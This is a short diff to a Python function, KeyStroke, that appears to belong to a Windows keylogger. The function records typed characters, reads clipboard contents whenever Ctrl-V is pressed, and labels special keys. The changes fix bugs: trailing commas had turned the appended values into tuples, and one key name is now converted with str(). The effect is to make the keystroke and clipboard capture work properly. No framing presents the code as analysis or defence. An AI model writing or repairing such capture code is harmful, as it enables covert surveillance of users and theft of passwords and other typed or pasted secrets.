@@ -53,7 +53,7 @@ def KeyStroke(event):
         
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        data += chr(event.Ascii),
+        data += chr(event.Ascii)
     else:
         # if Ctrl-V, get the value on the clipboard
         if event.Key == "V":
@@ -62,11 +62,11 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             
-            data += "[PASTE] - %s" % (pasted_value),
+            data += "[PASTE] - %s" % (pasted_value)
             
         else:
             
-            data += "[%s]" % event.Key,
+            data += "[%s]" % str(event.Key)
             
     # pass execution to next hook registered
     return True
